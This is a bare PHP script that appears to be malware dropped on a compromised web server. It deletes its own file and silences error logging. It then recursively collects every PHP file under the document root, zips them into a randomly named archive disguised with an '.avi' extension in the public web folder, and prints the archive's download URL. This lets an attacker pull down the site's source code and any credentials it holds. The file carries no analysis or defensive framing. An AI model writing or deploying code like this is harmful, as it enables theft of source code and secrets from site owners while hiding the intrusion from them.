<?php unlink(__FILE__); <?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);


function sdGetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE) {
        return $_SERVER['DOCUMENT_ROOT'];
    } elseif ($docroot_end === 0) {
        return "/";
    } else {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function sdGetFileList($dir, $depth = 1000000000)
{
    $result = array();
    $dir_count = 0;
    if ($depth < 1) {
        return $result;
    }
    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE) {
        return $result;
    }
    while (($f = readdir($h)) !== FALSE) {
        if ($f !== '.' and $f !== '..') {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir)) {
                $dir_count += 1;
                $result = array_merge($result, sdGetFileList($current_dir, $depth / 10));
            } else {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && $path_parts['extension'] == "php" && filesize($current_dir) < 2 * 1024 * 1024) {
                    $result[] = $current_dir;
                }
            }
        }
    }
    closedir($h);
    return $result;
}

$domain = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']);
$archive_name = md5(time()) . ".avi";
$archive_path = sdGetDocRoot() . "/" . $archive_name;
$res = array();
$zip = new ZipArchive;
$zip->open($archive_path, ZipArchive::CREATE);
foreach (sdGetFileList(sdGetDocRoot()) as $path) {
    $entryname = substr($path, strlen(sdGetDocRoot())+1);
    $zip->addFile($path, $entryname);
}
$zip->close();
echo "ARCHIVE!\t" . $domain . "\t" . "http://" . $domain . "/" . $archive_name . PHP_EOL;

